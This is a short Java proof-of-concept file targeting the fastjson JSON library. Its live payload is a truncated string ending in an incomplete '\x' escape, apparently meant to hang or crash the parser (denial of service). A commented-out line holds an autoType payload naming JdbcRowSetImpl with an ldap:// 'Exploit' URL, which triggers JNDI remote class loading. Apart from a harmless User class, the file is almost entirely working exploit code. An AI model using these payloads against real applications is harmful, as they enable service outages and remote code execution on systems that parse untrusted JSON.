package com.MyUtils.poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * @author liujiabei
 * @since 2019/11/20
 */
public class Fastjson {

    public static void main(String[] args) throws InterruptedException {
//        String myJSON = "{\"@type\":\"me.lightless.fastjsonvuln.User\",\"age\":99,\"username\":\"lightless\",\"secret\":\"2333\"}";
//        JSONObject u3 = JSON.parseObject(myJSON);
//        System.out.println("u3 => " + u3.get("secret"));
//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:9999/Exploit\", \"autoCommit\":true}";
        String payload = "{\"a\":\"\\x";
        JSONObject.parseObject(payload);
        System.out.println(1);
        Thread.sleep(1000*600);
    }
}


class User {
    private int age;
    public String username;
    private String secret;

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getSecret() {
        return secret;
    }
}